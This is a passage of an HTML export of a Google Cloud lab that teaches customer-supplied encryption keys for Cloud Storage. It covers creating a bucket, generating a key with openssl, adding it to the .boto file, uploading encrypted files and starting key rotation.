0.1px;">export BUCKET_NAME=[PUT Google_Cloud_PROJECT_ID HERE]-csek</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Enter the following command to create the bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil mb -l us gs://$BUCKET_NAME</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Configure required resources</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h5 id='download-a-sample-file-using-curl-and-make-two-copies'><span>Download a sample file using CURL and make two copies</span></h5><ol start='' ><li><p><span>Use the following command to download a sample file (this sample file is a publicly available Hadoop documentation HTML file). This file will be copied into the lab&#39;s storage bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">https://hadoop.apache.org/docs/current/\</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">hadoop-project-dist/hadoop-common/\</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ClusterSetup.html &gt; setup.html</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Make two copies of the file:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cp setup.html setup2.html</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cp setup.html setup3.html</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='task-2-configure-customer-supplied-encryption-keys'><span>Task 2. Configure customer-supplied encryption keys</span></h4><p><span>In this task, you generate a CESK key, upload the file to the Cloud Console, and then delete the local copy.</span></p><h5 id='generate-a-csek-key'><span>Generate a CSEK key</span></h5><p><strong><span>Note:</span></strong><span> When using customer-supplied encryption keys, it is up to you to generate and manage your encryption keys. You must provide Cloud Storage a key that is a 256-bit string encoded in </span><a href='https://tools.ietf.org/html/rfc4648#section-4'><span>RFC 4648 standard base64</span></a><span>. For this lab, you will generate a key with a random number.</span></p><ol start='' ><li><p><span>In the </span><strong><span>cseklab-vm</span></strong><span> SSH terminal, run the following command to create a key:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">openssl rand 32 &gt; mykey.txt</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">openssl base64 -in mykey.txt</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tmxElCaabWvJqR7uXEWQF39DhWTcDvChzuCmpHe6sb0=</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='' ><li><p><span>Copy the value of the generated key. You will require this for a later step.</span></p></li></ol><h5 id='modify-the-boto-file'><span>Modify the .boto file</span></h5><p><strong><span>Note:</span></strong><span> The encryption controls are contained in a </span><strong><span>gsutil</span></strong><span> configuration file named </span><strong><span>.boto</span></strong><span>.</span></p><ol start='' ><li><p><span>Run the following command in the SSH terminal to verify the </span><strong><span>.boto</span></strong><span> file exists:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ls -al</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>If you do not see a </span><strong><span>.boto</span></strong><span> file run the following commands to generate and list it:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil config -n</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ls -al</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>To edit the </span><strong><span>.boto</span></strong><span> file, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nano .boto</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Within the </span><strong><span>.boto</span></strong><span> file, locate the line with &quot;</span><strong><span>#encryption_key=</span></strong><span>&quot;. To search in Nano, click the keyboard located in the top right of the </span><strong><span>SSH</span></strong><span> window, select </span><strong><span>Ctrl+W</span></strong><span> and type </span><code>#encrypt</code><span>.</span></p></li></ol><p><img src="images\%2FPcPxjRygAd4QZW7mkKCTeh4rA%2BY9QbLxs%2FHtFVSUFk%3D" referrerpolicy="no-referrer" alt="Ctrl+W on virtual keyboard"></p><ol start='' ><li><p><span>Uncomment the encryption_key line by removing the </span><strong><span>#</span></strong><span> character, and paste the key you generated earlier.</span></p></li></ol><p><strong><span>Example:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Before:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># encryption_key=</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">After:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">encryption_key=tmxElCaabWvJqR7uXEWQF39DhWTcDvChzuCmpHe6sb0=</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+X</span></strong><span> to Exit, </span><strong><span>Y</span></strong><span> to save the file, then </span><strong><span>Enter</span></strong><span> to confirm the filename.</span></p></li></ol><h5 id='upload-files-encrypted-and-verify-in-the-cloud-console'><span>Upload files (encrypted) and verify in the Cloud Console</span></h5><ol start='' ><li><p><span>Run the following commands to upload two files:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp setup.html gs://$BUCKET_NAME</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp setup2.html gs://$BUCKET_NAME</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Return to the Cloud Console and view the storage bucket contents by selecting </span><strong><span>Navigation menu &gt; Cloud Storage</span></strong><span>, then click on the bucket.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Both the setup.html and setup2.html files show that they are customer-encrypted.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Configuring customer-supplied encryption keys</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h5 id='delete-a-local-file-copy-from-cloud-storage-and-verify-encryption'><span>Delete a local file, copy from Cloud Storage, and verify encryption</span></h5><ol start='' ><li><p><span>Delete the local </span><strong><span>setup.html</span></strong><span> file, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rm setup.html</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>To copy the file back from the bucket, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp gs://$BUCKET_NAME/setup.html ./</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>View the file to see whether they made it back with the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat setup.html</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='task-3-rotate-csek-keys'><span>Task 3. Rotate CSEK keys</span></h4><p><span>In this task, you rotate CSEK keys. To rotate CSEKs, you change your encryption_key configuration value to a decryption_key configuration value and then use a new value for the encryption_key.</span></p><p><span>Then you can use the rewrite command to rotate keys in the cloud without downloading and re-uploading the data.</span></p><h5 id='generate-another-csek-key-and-add-to-the-boto-file'><span>Generate another CSEK key and add to the boto file</span></h5><ol start='' ><li><p><span>In the SSH terminal, run the following command to generate a new key:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">openssl rand 32 &gt; mykey.txt</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">openssl base64 -in mykey.txt</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Copy the value of the generated key from the command output. Key should be in form of </span><code>tmxElCaabWvJqR7uXEWQF39DhWTcDvChzuCmpHe6sb0=</code><span>.</span></p></li><li><p><span>To open the boto file, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div 